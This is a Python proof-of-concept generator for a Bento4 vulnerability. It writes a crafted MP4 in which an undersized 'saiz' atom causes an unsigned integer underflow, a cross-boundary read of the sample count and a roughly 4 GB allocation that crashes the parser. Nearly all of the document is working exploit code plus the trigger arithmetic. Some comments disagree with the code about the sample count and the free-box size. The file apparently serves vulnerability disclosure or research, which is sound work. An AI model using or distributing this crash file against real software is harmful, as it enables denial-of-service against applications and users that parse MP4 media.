#!/usr/bin/env python3
"""
PoC Generator — VULN 005
AP4_SaizAtom unsigned integer underflow bypasses entry-count bounds check

Vulnerability in Bento4 Ap4SaizAtom.cpp lines 78-89:
  AP4_UI32 remains = size - GetHeaderSize();   // GetHeaderSize() == 12
  if (flags & 1) {
      stream.ReadUI32(m_AuxInfoType);
      stream.ReadUI32(m_AuxInfoTypeParameter);
      remains -= 8;
  }
  stream.ReadUI08(m_DefaultSampleInfoSize);
  stream.ReadUI32(m_SampleCount);
  remains -= 5;
  if (m_DefaultSampleInfoSize == 0) {
      if (m_SampleCount > remains) m_SampleCount = remains;  // sanity check bypassed
      m_Entries.SetItemCount(sample_count);         // OOM here
      unsigned char* buffer = new AP4_UI08[sample_count];  // or OOM here

Trigger with size=20, flags=0x000001:
  remains = 20 - 12 = 8
  Read 8 bytes for aux fields → remains = 0
  remains -= 5  →  0 - 5 = 0xFFFFFFFB  (unsigned underflow!)
  Sanity check: m_SampleCount > 0xFFFFFFFB → nearly impossible to fail
  Any sample_count < 0xFFFFFFFB passes unclamped → huge allocation → OOM crash

Cross-boundary read: with size=20, all 8 body bytes consumed by aux fields.
The next 5 bytes (default_sample_info_size + sample_count) are read from the
bytes immediately following the saiz atom in the file stream.

We place a 'free' box after saiz whose first 5 bytes encode:
  default_sample_info_size = 0x00  (triggers per-sample-entry branch)
  sample_count             = 0xFF000000  (~4 GB-16 MB allocation)

With ASAN enabled, new[] of ~4 GB throws std::bad_alloc → std::terminate → abort.
"""

import struct
import os

# ---------------------------------------------------------------------------
# Box helpers
# ---------------------------------------------------------------------------

def box(btype: bytes, data: bytes = b'') -> bytes:
    assert len(btype) == 4
    return struct.pack('>I', 8 + len(data)) + btype + data

def fullbox(btype: bytes, version: int, flags: int, data: bytes = b'') -> bytes:
    return box(btype, struct.pack('>I', ((version & 0xFF) << 24) | (flags & 0xFFFFFF)) + data)

# ---------------------------------------------------------------------------
# Minimal required sample-table boxes
# ---------------------------------------------------------------------------

stsd = fullbox(b'stsd', 0, 0, struct.pack('>I', 0))           # entry_count=0
stts = fullbox(b'stts', 0, 0, struct.pack('>I', 0))           # entry_count=0
stsc = fullbox(b'stsc', 0, 0, struct.pack('>I', 0))           # entry_count=0
stsz = fullbox(b'stsz', 0, 0, struct.pack('>II', 0, 0))       # sample_size=0, count=0
stco = fullbox(b'stco', 0, 0, struct.pack('>I', 0))           # entry_count=0

# ---------------------------------------------------------------------------
# Crafted saiz: size=20, version=0, flags=0x000001
#   header : size(4)+type(4)+version(1)+flags(3) = 12 bytes
#   body   : aux_info_type(4)=0 + aux_info_type_parameter(4)=0 = 8 bytes
#   total  : 20 bytes
#
# After reading the 8-byte body:
#   remains = 20 - 12 = 8  →  -8  →  0  →  -5  →  0xFFFFFFFB  (underflow)
# ---------------------------------------------------------------------------

saiz  = struct.pack('>I', 20) + b'saiz'          # size=20, type
saiz += b'\x00' + struct.pack('>I', 0x000001)[1:]  # version=0, flags=0x000001 (3 bytes)
saiz += struct.pack('>II', 0, 0)                  # aux_info_type=0, aux_info_type_parameter=0
assert len(saiz) == 20

# ---------------------------------------------------------------------------
# 'free' box placed immediately after saiz.
# The saiz constructor reads 5 bytes CROSS-BOUNDARY from this box's header:
#   byte  0 of free box → m_DefaultSampleInfoSize
#   bytes 1-4 of free box → m_SampleCount (big-endian)
#
# We want:
#   free_size[0]      = 0x00  → m_DefaultSampleInfoSize = 0  (trigger allocation)
#   free_size[1..3]   = 0xFF, 0x00, 0x00
#   free_type[0]      = 0x66  ('f' from b'free')
#   → sample_count = 0xFF000066 = 4278190182  (~4 GB)
#
# Even with the "sanity" clamp (m_SampleCount = remains = 0xFFFFFFFB if larger),
# the resulting allocation attempt is ~4 GB → OOM → std::bad_alloc → crash.
#
# free box size chosen as 0x00FF0008 = 16711688 bytes.  That's large, but the
# crash happens during saiz construction — before Bento4 ever tries to parse
# the rest of the stbl.  To keep the file small we use a minimal 'free' box
# whose header already encodes the desired bytes.
#
# size = 0x00FF0000 = 16711680  →  size bytes: 0x00, 0xFF, 0x00, 0x00
# type = b'free'                →  type[0]  = 0x66
#
# Cross-boundary bytes seen by saiz:
#   [0x00, 0xFF, 0x00, 0x00, 0x66]
#   default_sample_info_size = 0x00         (enters allocation branch)
#   sample_count BE          = 0xFF000066   = 4,278,190,182  (~4 GB)
#
# 4,278,190,182 > 0xFFFFFFFB (= 4,294,967,291) → FALSE → no clamp
# → new AP4_UI08[4,278,190,182] → OOM → abort
# ---------------------------------------------------------------------------

FREE_SIZE = 0x00FF0000   # 16,711,680 bytes — large but real; crash before parse
# We do NOT write the actual payload bytes; the enclosing stbl size declaration
# covers just the header (8 bytes). The crash happens before further parsing.
free_hdr = struct.pack('>I', FREE_SIZE) + b'free'   # 8 bytes: size + type

# ---------------------------------------------------------------------------
# stbl = standard boxes + saiz + free-box-header-only
# ---------------------------------------------------------------------------

stbl_data = stsd + stts + stsc + stsz + stco + saiz + free_hdr
stbl = box(b'stbl', stbl_data)

# ---------------------------------------------------------------------------
# Enclosing track / movie structure
# ---------------------------------------------------------------------------

# smhd (sound media header)
smhd = fullbox(b'smhd', 0, 0, struct.pack('>HH', 0, 0))

# dinf / dref
url_ = fullbox(b'url ', 0, 1, b'')          # flags=1 → self-contained
dref = fullbox(b'dref', 0, 0, struct.pack('>I', 1) + url_)
dinf = box(b'dinf', dref)

minf = box(b'minf', smhd + dinf + stbl)

# mdhd
mdhd = fullbox(b'mdhd', 0, 0, struct.pack('>IIIII',
    0, 0, 44100, 0, 0x15c70000))   # ct, mt, timescale, duration, lang+pre_defined

# hdlr
hdlr_name = b'Sound Handler\x00'
hdlr = fullbox(b'hdlr', 0, 0,
    struct.pack('>I', 0) + b'soun' + b'\x00' * 12 + hdlr_name)

mdia = box(b'mdia', mdhd + hdlr + minf)

# tkhd (version 0, flags=3 = enabled+in-movie)
matrix = struct.pack('>9i',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)
tkhd = fullbox(b'tkhd', 0, 3,
    struct.pack('>IIIII', 0, 0, 1, 0, 0) +
    struct.pack('>II', 0, 0) +
    struct.pack('>hh', 0, 0) +
    struct.pack('>HH', 0x0100, 0) +
    matrix +
    struct.pack('>II', 0, 0))

trak = box(b'trak', tkhd + mdia)

# mvhd (version 0)
mvhd = fullbox(b'mvhd', 0, 0,
    struct.pack('>IIIII', 0, 0, 1000, 0, 0x00010000) +
    struct.pack('>HH', 0x0100, 0) +
    b'\x00' * 10 +
    matrix +
    b'\x00' * 24 +
    struct.pack('>I', 2))

moov = box(b'moov', mvhd + trak)

# ftyp
ftyp = box(b'ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom')

mp4 = ftyp + moov

# ---------------------------------------------------------------------------
# Write output
# ---------------------------------------------------------------------------

out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_005.mp4')
with open(out_path, 'wb') as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to {out_path}")
print(f"[+] saiz atom: size=20, flags=0x000001, body=8 zero bytes")
print(f"[+] Cross-boundary read: free-box header bytes → sample_count=0xFF000066 (~4 GB)")
print(f"[+] Expected: std::bad_alloc / OOM → abort / crash")
